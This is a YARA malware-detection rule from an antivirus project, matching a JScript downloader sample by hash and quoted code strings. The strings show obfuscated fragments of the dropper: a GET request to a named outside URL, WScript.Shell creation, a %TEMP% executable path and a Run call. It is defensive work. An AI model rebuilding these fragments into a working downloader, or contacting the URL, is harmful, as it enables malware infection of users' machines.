rule sig_20160330_b2cae01cdb54aff64ebb07ae0635de5d {
  meta:
    description = "datamaliciousorder - file 20160330_b2cae01cdb54aff64ebb07ae0635de5d.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "dc593176393729653022a6426891ef72290775d9a2f33cbce15192b5c554f31e"

  strings:
    $s1  = "_IN[_P](\"GET\", \"http://dev.orolatina.com/s3isk\", false);" fullword ascii
    $s2  = "function _Z(_HP, _UM){_ZM = _ZM * 1; return _HP - _UM;};" fullword ascii
    $s3  = "var _M0 = function _GC() {return WScript[_DO](\"WScript\"+\".Shell\");}(), _UN = 11;" fullword ascii
    $s4  = "if (_IN[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function _HX(){return _D + \"\";};" fullword ascii
    $s6  = "function _C() {return _M0[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"E3rFFqqkr.ex\" + \"e\";};" fullword ascii
    $s7  = "function _N(_G){_M0[\"Run\"](_G, _ZM, _ZM);};" fullword ascii
    $s8  = "function _DI() {return ((_X == true) && (_X == _K)) ? 1 : _ZM;};" fullword ascii
    $s9  = "function _Y()" fullword ascii
    $s10 = " while (_W){" fullword ascii
    $s11 = "function _B(){return 22;};" fullword ascii
    $s12 = "function _J(){return _DO;};" fullword ascii
    $s13 = "return _Z(_F, _WI);" fullword ascii
    $s14 = "var _Y0 = new this[\"Date\"]();" fullword ascii
    $s15 = "function _TA(_DS) {var _M = (1, 2, 3, 4, 5, _DS); return _M;};" fullword ascii
    $s16 = "var _X = false;" fullword ascii
    $s17 = "_X = true; " fullword ascii
    $s18 = "var _K = false;" fullword ascii
    $s19 = "_K = true; " fullword ascii
    $s20 = "var _WY = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}